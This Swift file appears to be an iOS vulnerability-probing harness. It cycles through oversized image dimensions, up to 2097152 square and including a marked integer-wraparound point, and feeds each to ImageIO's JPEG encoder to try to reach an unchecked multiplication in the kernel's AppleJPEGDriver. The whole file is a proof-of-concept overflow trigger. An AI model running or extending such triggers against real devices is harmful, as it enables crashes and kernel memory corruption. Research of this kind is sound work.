// AVERunnerJPEG2.swift — 26.3 JPEG encode via ImageIO (CGImageDestination)
// ImageIO JPEG encoder on iOS may route to hardware AppleJPEGDriver.
// Huge CGImage dims -> possible reach of kernel startEncoder unchecked mul path.
import ImageIO
import CoreGraphics
import UIKit
import UniformTypeIdentifiers

final class AVERunnerJPEG2 {
    static let shared = AVERunnerJPEG2()
    private init() {}

    private let dims: [(Int, Int, String)] = [
        (1920, 1080, "1080p 基线"),
        (8192, 8192, "8192²"),
        (16384, 16384, "16384²"),
        (32768, 32768, "32768²"),
        (65536, 65536, "65536²"),
        (131072, 131072, "131072² 0x20000"),
        (262144, 262144, "262144² 0x40000"),
        (524288, 524288, "524288² 0x80000 回绕点"),
        (1048576, 1048576, "1048576² 0x100000"),
        (2097152, 2097152, "2097152² 0x200000"),
    ]
    private var idx = 0
    private var outLog: (String) -> Void = { _ in }

    func next() -> String {
        idx = (idx + 1) % dims.count
        return "next JPEG2 = \(dims[idx].2)"
    }

    func run(_ report: @escaping (String) -> Void) {
        let (w, h, tag) = dims[idx]
        report("=== JPEG2 ImageIO [\(idx)] \(tag) \(w)x\(h) ===")
        outLog = report

        // dummy small pixel data; CGImageCreate accepts arbitrary dims
        let dummy = [UInt8](repeating: 0x7f, count: 8192)
        guard let provider = CGDataProvider(data: dummy as CFData) else {
            report("no provider"); return
        }
        guard let cs = CGColorSpace(name: CGColorSpace.sRGB) else {
            report("no colorspace"); return
        }
        report("CGImageCreate \(w)x\(h)...")
        guard let img = CGImage(width: w, height: h,
                                bitsPerComponent: 8, bitsPerPixel: 32,
                                bytesPerRow: w * 4,
                                space: cs,
                                bitmapInfo: CGBitmapInfo(rawValue: CGImageAlphaInfo.premultipliedLast.rawValue),
                                provider: provider, decode: nil,
                                shouldInterpolate: false, intent: .defaultIntent) else {
            report("CGImageCreate FAIL"); return
        }
        report("CGImage OK")

        let tmp = FileManager.default.temporaryDirectory
            .appendingPathComponent("jpeg2_\(idx).jpg") as CFURL
        guard let dest = CGImageDestinationCreateWithURL(tmp, UTType.jpeg.identifier as CFString, 1, nil) else {
            report("dest fail"); return
        }
        report("dest created, adding image...")
        CGImageDestinationAddImage(dest, img, nil)
        report("finalizing...")
        let ok = CGImageDestinationFinalize(dest)
        report("finalize=\(ok)")
        if ok {
            if let sz = (try? FileManager.default.attributesOfItem(atPath: (tmp as URL).path))?[.size] as? Int {
                report("out size=\(sz)")
            }
        }
    }
}
